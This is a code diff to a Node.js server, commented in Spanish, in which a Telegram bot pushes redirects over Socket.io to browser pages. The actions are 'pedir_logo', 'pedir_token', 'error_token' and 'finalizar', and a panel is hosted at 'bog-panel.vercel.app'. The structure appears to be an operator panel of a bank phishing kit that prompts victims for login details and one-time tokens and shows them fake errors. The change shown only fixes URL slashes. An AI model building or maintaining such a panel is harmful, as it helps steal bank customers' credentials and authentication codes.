@@ -146,29 +146,36 @@ app.get(['/', '/index.html', '/token.html', '/dashboard.html'], (req, res) => {
 // Función para manejar redirecciones
 const handleRedirect = (action, baseUrl = '') => {
     const redirects = {
-        'error_logo': { 
-            url: `${baseUrl}index.html?action=error_logo`, 
+        'error_logo': {
+            url: `${baseUrl}/index.html?action=error_logo`,
             message: 'Por favor verifique su logo e intente nuevamente.'
         },
-        'pedir_logo': { 
-            url: `${baseUrl}index.html?action=pedir_logo`, 
+
+        'pedir_logo': {
+            url: `${baseUrl}/index.html?action=pedir_logo`,
             message: null
         },
-        'error_token': { 
-            url: `${baseUrl}token.html?action=error_token`, 
+
+        'error_token': {
+            url: `${baseUrl}/token.html?action=error_token`,
             message: 'Token incorrecto. Por favor intente nuevamente.'
         },
-        'pedir_token': { 
-            url: `${baseUrl}token.html?action=pedir_token`, 
+
+        'pedir_token': {
+            url: `${baseUrl}/token.html?action=pedir_token`,
             message: null
         },
-        'finalizar': { 
-            url: `${baseUrl}dashboard.html?action=finalizar`, 
+
+        'finalizar': {
+            url: `${baseUrl}/dashboard.html?action=finalizar`,
             message: 'Proceso finalizado exitosamente'
         }
     };
 
-    return redirects[action] || { url: `${baseUrl}/`, message: null };
+    return redirects[action] || {
+        url: `${baseUrl}/`,
+        message: null
+    };
 };
 
 // Socket.io manejo de conexiones
@@ -182,7 +189,7 @@ io.on('connection', (socket) => {
             console.log(`Procesando acción ${action} para mensaje ${messageId}`);
 
             const isVercel = process.env.VERCEL === '1';
-            const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '/token.html';
+            const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '';
             const { message, url } = handleRedirect(action, baseUrl);
 
             socket.emit('telegram_action', {
@@ -246,7 +253,7 @@ bot.on('callback_query', async (callbackQuery) => {
         
         // Configurar URL base según el entorno
         const isVercel = process.env.VERCEL === '1';
-        const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '/token.html';
+        const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '';
 
         // Responder al callback query
         await bot.answerCallbackQuery(callbackQuery.id, {
